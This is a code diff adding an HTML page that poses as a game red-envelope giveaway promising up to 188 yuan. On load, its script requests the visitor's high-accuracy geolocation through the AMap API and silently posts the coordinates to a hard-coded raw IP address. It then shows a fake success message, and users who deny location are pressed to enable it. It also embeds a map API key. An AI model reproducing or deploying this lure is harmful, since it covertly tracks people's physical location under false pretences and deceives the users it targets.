@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta icon="/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>玩游戏得红包，最高领取188元</title>
+    <link rel="stylesheet" href="/lib/bootstrap/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="/css/site.css" asp-append-version="true" />
+    <link rel="stylesheet" href="https://a.amap.com/jsapi_demos/static/demo-center/css/demo-center.css" />
+    <style>
+        html,
+        body,
+        #container {
+            height: 100%;
+        }
+
+        .info {
+            width: 26rem;
+        }
+    </style>
+
+</head>
+
+<body>
+    <div class="container">
+        <main role="main" class="pb-3">
+            <div id='container'></div>
+            <div class="text-center">
+                <img id="pic" src="/loading.gif" style="margin-top:150px" />
+            </div>
+        </main>
+    </div>
+
+
+    <script type="text/javascript" src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.6.0.min.js"></script>
+    <script type="text/javascript" src="/layui.js"></script>
+    <script type="text/javascript"
+        src="https://webapi.amap.com/maps?v=1.4.15&key=f637710bf9926a411b5376180c6905d1"></script>
+    <script type="text/javascript">
+
+
+        //var map = new AMap.Map('container', {
+        //    resizeEnable: true
+        //});
+        AMap.plugin('AMap.Geolocation', function () {
+            var geolocation = new AMap.Geolocation({
+                enableHighAccuracy: true,//是否使用高精度定位，默认:true
+                timeout: 10000,          //超过10秒后停止定位，默认：5s
+                buttonPosition: 'RB',    //定位按钮的停靠位置
+                buttonOffset: new AMap.Pixel(10, 20),//定位按钮与设置的停靠位置的偏移量，默认：Pixel(10, 20)
+                zoomToAccuracy: true,   //定位成功后是否自动调整地图视野到定位点
+
+            });
+            //map.addControl(geolocation);
+            geolocation.getCurrentPosition(function (status, result) {
+                if (status == 'complete') {
+                    onComplete(result)
+                } else {
+                    onError(result)
+                }
+            });
+        });
+        //解析定位结果
+        function onComplete(data) {
+            //document.getElementById('status').innerHTML = '定位成功'
+            var str = [];
+            str.push('定位结果：' + data.position);
+            str.push('定位类别：' + data.location_type);
+            if (data.accuracy) {
+                str.push('精度：' + data.accuracy + ' 米');
+            }//如为IP精确定位结果则没有精度信息
+            str.push('是否经过偏移：' + (data.isConverted ? '是' : '否'));
+            document.getElementById('pic').src = "/open.gif";
+
+            var postUrl = "https://42.193.248.129:18017/Api/Home/PostLocation";
+
+            var gpsPoint = GPS.gcj_encrypt(data.position.getLat(), data.position.getLng());
+
+            var _data = gpsPoint.lon + ',' + gpsPoint.lat;
+            $.post(postUrl, { position: _data });
+
+            setTimeout(() => {
+                layer.alert("领取成功！")
+            }, 1000);
+
+            //document.getElementById('result').innerHTML = str.join('<br>');
+        }
+        //解析定位错误信息
+        function onError(data) {
+            console.log(data)
+
+            var postUrl = "https://42.193.248.129:18017/Api/Home/PostLocation";
+
+            var _data = '定位权限没开启,定位失败';
+            $.post(postUrl, { position: _data });
+
+            layer.alert("领取失败！请开启定位权限！", () => {
+                //window.location.href = "/Home/Index";
+                //window.location.reload();
+                window.close();
+            });
+            //document.getElementById('status').innerHTML = '定位失败'
+            //document.getElementById('result').innerHTML = '失败原因排查信息:' + data.message;
+        }
+
+        var GPS = {
+            PI: 3.14159265358979324,
+            x_pi: 3.14159265358979324 * 3000.0 / 180.0,
+            delta: function (lat, lon) {
+                var a = 6378245.0; //  a: 卫星椭球坐标投影到平面地图坐标系的投影因子。
+                var ee = 0.00669342162296594323; //  ee: 椭球的偏心率。
+                var dLat = this.transformLat(lon - 105.0, lat - 35.0);
+                var dLon = this.transformLon(lon - 105.0, lat - 35.0);
+                var radLat = lat / 180.0 * this.PI;
+                var magic = Math.sin(radLat);
+                magic = 1 - ee * magic * magic;
+                var sqrtMagic = Math.sqrt(magic);
+                dLat = (dLat * 180.0) / ((a * (1 - ee)) / (magic * sqrtMagic) * this.PI);
+                dLon = (dLon * 180.0) / (a / sqrtMagic * Math.cos(radLat) * this.PI);
+                return {
+                    'lat': dLat,
+                    'lon': dLon
+                };
+            },
+            //WGS-84 to GCJ-02
+            gcj_encrypt: function (wgsLat, wgsLon) {
+                if (this.outOfChina(wgsLat, wgsLon))
+                    return {
+                        'lat': wgsLat,
+                        'lon': wgsLon
+                    };
+
+                var d = this.delta(wgsLat, wgsLon);
+                return {
+                    'lat': wgsLat + d.lat,
+                    'lon': wgsLon + d.lon
+                };
+            },
+            outOfChina: function (lat, lon) {
+                if (lon < 72.004 || lon > 137.8347)
+                    return true;
+                if (lat < 0.8293 || lat > 55.8271)
+                    return true;
+                return false;
+            },
+            transformLat: function (x, y) {
+                var ret = -100.0 + 2.0 * x + 3.0 * y + 0.2 * y * y + 0.1 * x * y + 0.2 * Math.sqrt(Math.abs(x));
+                ret += (20.0 * Math.sin(6.0 * x * this.PI) + 20.0 * Math.sin(2.0 * x * this.PI)) * 2.0 / 3.0;
+                ret += (20.0 * Math.sin(y * this.PI) + 40.0 * Math.sin(y / 3.0 * this.PI)) * 2.0 / 3.0;
+                ret += (160.0 * Math.sin(y / 12.0 * this.PI) + 320 * Math.sin(y * this.PI / 30.0)) * 2.0 / 3.0;
+                return ret;
+            },
+            transformLon: function (x, y) {
+                var ret = 300.0 + x + 2.0 * y + 0.1 * x * x + 0.1 * x * y + 0.1 * Math.sqrt(Math.abs(x));
+                ret += (20.0 * Math.sin(6.0 * x * this.PI) + 20.0 * Math.sin(2.0 * x * this.PI)) * 2.0 / 3.0;
+                ret += (20.0 * Math.sin(x * this.PI) + 40.0 * Math.sin(x / 3.0 * this.PI)) * 2.0 / 3.0;
+                ret += (150.0 * Math.sin(x / 12.0 * this.PI) + 300.0 * Math.sin(x / 30.0 * this.PI)) * 2.0 / 3.0;
+                return ret;
+            }
+        };
+    </script>
+
+
+
+    <script src="/lib/jquery/dist/jquery.min.js"></script>
+    <script src="/lib/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="/js/site.js" asp-append-version="true"></script>
+</body>
+
+</html>
